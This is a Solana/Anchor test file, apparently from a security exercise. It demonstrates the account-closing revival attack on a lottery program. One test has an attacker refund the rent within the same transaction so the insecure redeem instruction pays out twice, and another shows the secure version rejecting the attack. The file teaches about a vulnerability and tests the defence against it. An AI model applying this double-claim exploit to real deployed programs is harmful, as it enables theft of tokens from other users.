import * as anchor from "@coral-xyz/anchor";
import { Program, web3 } from "@coral-xyz/anchor";
import { SolanaClosingAccounts } from "../target/types/solana_closing_accounts";
import { safeAirdrop } from "./utils/utils";
import {
    createMint,
    getAccount,
    getOrCreateAssociatedTokenAccount,
    TOKEN_PROGRAM_ID,
} from "@solana/spl-token";
import {
    sendAndConfirmTransaction,
    SystemProgram,
    Transaction,
} from "@solana/web3.js";
import { expect } from "chai";

describe("solana-closing-accounts", () => {
    // Configure the client to use the local cluster.
    anchor.setProvider(anchor.AnchorProvider.env());

    const connection = anchor.AnchorProvider.env().connection;
    const program = anchor.workspace
        .SolanaClosingAccounts as Program<SolanaClosingAccounts>;

    // Configure the client to use the local cluster.
    anchor.setProvider(anchor.AnchorProvider.env());
    const provider = anchor.AnchorProvider.env();
    //  const program = anchor.workspace.ClosingAccounts as Program<ClosingAccounts>
    const attacker = web3.Keypair.generate();
    let rewardMint: web3.PublicKey;
    let mintAuth: web3.PublicKey;
    let mint: web3.PublicKey;
    let attackerLotteryEntry: web3.PublicKey;
    let attackerAta: web3.PublicKey;

    before(async () => {
        [mint] = await web3.PublicKey.findProgramAddressSync(
            [Buffer.from("mint-seed")],
            program.programId
        );
        mintAuth = mint;

        await safeAirdrop(attacker.publicKey, provider.connection);

        rewardMint = await createMint(
            provider.connection,
            attacker,
            mintAuth,
            null,
            6
        );
        [attackerLotteryEntry] = await web3.PublicKey.findProgramAddressSync(
            [attacker.publicKey.toBuffer()],
            program.programId
        );

        attackerAta = (
            await getOrCreateAssociatedTokenAccount(
                provider.connection,
                attacker,
                rewardMint,
                attacker.publicKey
            )
        ).address;
    });

    it("Enter lottery", async () => {
        // tx to enter lottery
        await program.methods
            .enterLottery()
            .accounts({
                lotteryEntry: attackerLotteryEntry,
                user: attacker.publicKey,
                userAta: attackerAta,
                systemProgram: SystemProgram.programId,
            })
            .signers([attacker])
            .rpc();
    });

    it("attacker  can close + refund lottery acct + claim multiple rewards", async () => {
        // claim multiple times
        for (let i = 0; i < 2; i++) {
            const tx = new Transaction();
            // instruction claims rewards, program will try to close account
            tx.add(
                await program.methods
                    .redeemWinningsInsecure()
                    .accounts({
                        lotteryEntry: attackerLotteryEntry,
                        user: attacker.publicKey,
                        userAta: attackerAta,
                        rewardMint: rewardMint,
                        mintAuth: mintAuth,
                        tokenProgram: TOKEN_PROGRAM_ID,
                    })
                    .instruction()
            );

            // user adds instruction to refund dataAccount lamports
            const rentExemptLamports =
                await provider.connection.getMinimumBalanceForRentExemption(
                    82,
                    "confirmed"
                );

            // =================== 牛逼: 重新打一笔租金, 不让系统回收账户,
            // =================== 因为Solana的垃圾回收是整个交易结束之后才进行，而一笔交易包含多个指令
            tx.add(
                SystemProgram.transfer({
                    fromPubkey: attacker.publicKey,
                    toPubkey: attackerLotteryEntry,
                    lamports: rentExemptLamports,
                })
            );
            // send tx
            await sendAndConfirmTransaction(provider.connection, tx, [
                attacker,
            ]);
            await new Promise((x) => setTimeout(x, 5000));
        }

        const ata = await getAccount(provider.connection, attackerAta);
        const lotteryEntry = await program.account.lotteryAccount.fetch(
            attackerLotteryEntry
        );

        // expect(Number(ata.amount)).to.equal(
        //     lotteryEntry.timestamp.toNumber() * 10 * 2
        // );
        expect(Number(ata.amount)).to.equal(10 * 2);
    });

    it("Enter lottery & Claim Secure & Refund", async () => {
        // tx to enter lottery

        const attacker2 = web3.Keypair.generate();
        await safeAirdrop(attacker2.publicKey, provider.connection);

        const [attackerLotteryEntry2] =
            await web3.PublicKey.findProgramAddressSync(
                [attacker2.publicKey.toBuffer()],
                program.programId
            );

        const attackerAta2 = (
            await getOrCreateAssociatedTokenAccount(
                provider.connection,
                attacker2,
                rewardMint,
                attacker2.publicKey
            )
        ).address;

        await program.methods
            .enterLottery()
            .accounts({
                lotteryEntry: attackerLotteryEntry2,
                user: attacker2.publicKey,
                userAta: attackerAta2,
                systemProgram: SystemProgram.programId,
            })
            .signers([attacker2])
            .rpc();

        let rentExemptLamports_attack = 0;
        try {
            for (let i = 0; i < 2; i++) {
                const tx = new Transaction();
                // instruction claims rewards, program will try to close account
                tx.add(
                    await program.methods
                        .redeemWinningsSecure()
                        .accounts({
                            lotteryEntry: attackerLotteryEntry2,
                            user: attacker2.publicKey,
                            userAta: attackerAta2,
                            rewardMint: rewardMint,
                            mintAuth: mintAuth,
                            tokenProgram: TOKEN_PROGRAM_ID,
                        })
                        .instruction()
                );

                // user adds instruction to refund dataAccount lamports
                rentExemptLamports_attack =
                    await provider.connection.getMinimumBalanceForRentExemption(
                        82,
                        "confirmed"
                    );

                console.log(
                    "===> rentExemptLamports: ",
                    rentExemptLamports_attack
                );

                // =================== 牛逼: 重新打一笔租金, 不让系统回收账户,
                //  但是，因为一个交易执行完成之后，账户被设置了 CLOSED_ACCOUNT_DISCRIMINATOR
                tx.add(
                    SystemProgram.transfer({
                        fromPubkey: attacker2.publicKey,
                        toPubkey: attackerLotteryEntry2,
                        lamports: rentExemptLamports_attack,
                    })
                );
                // send tx
                const sig = await sendAndConfirmTransaction(
                    provider.connection,
                    tx,
                    [attacker2]
                );
                console.log("sig==> ", sig.toString());
                await new Promise((x) => setTimeout(x, 5000));
            }
        } catch (error) {
            console.error(error);
            expect(error.message).to.include(
                "The given account is owned by a different program than expected"
            );
        }

        let ata = await getAccount(provider.connection, attackerAta2);

        expect(Number(ata.amount)).to.equal(10);

        // 查看 attackerLotteryEntry2 的owner 是 System Program
        const accInfo = await connection.getAccountInfo(attackerLotteryEntry2);

        expect(accInfo.owner.toBase58()).to.equal(
            SystemProgram.programId.toBase58()
        );
        expect(accInfo.data.length).to.equal(0);

        // 第一笔交易中包含2个指令，第一笔交易的2个指令都成功，
        // 所以，第一笔交易中的第一个指令redeemWinningsSecure 执行结束之后,
        //  attackerLotteryEntry2账户被重置了，但是attackerLotteryEntry2账户还是存在的, 没有被Solana回收
        //  因此， 第二个指令的发送 Lamports的指令也是可以成功的
        expect(accInfo.lamports).to.equal(rentExemptLamports_attack);

        // 测试force_defund, 此时账户已经被关闭，data已经被清空，owner也被改变了
        //
        //
        // close约束是在指令的主逻辑执行完成后才开始执行，close包含3个操作：
        //    1, 将账户的而lamports转入target账户中
        //    2, 将账户数据清零
        //    3, 将账户的owner设置为System Program
        // 注意，solana进行垃圾回收的时机是在 整个交易 执行完成之后进行
        try {
            const tx2 = new Transaction();
            tx2.add(
                await program.methods
                    .forceDefund()
                    .accounts({
                        dataAccount: attackerLotteryEntry2,
                        destination: attacker2.publicKey,
                    })
                    .instruction()
            );

            // send tx
            await sendAndConfirmTransaction(provider.connection, tx2, [
                attacker2,
            ]);

            // 验证force_refund 后，ata 应该是 0
            // const ata2 = await getAccount(provider.connection, attackerAta2);
            // expect(Number(ata2.amount)).to.equal(0);
            throw new Error("failed");
        } catch (error: any) {
            console.error(error);
            expect(error.message).to.include("data.len() > 8");
        }
    });
});
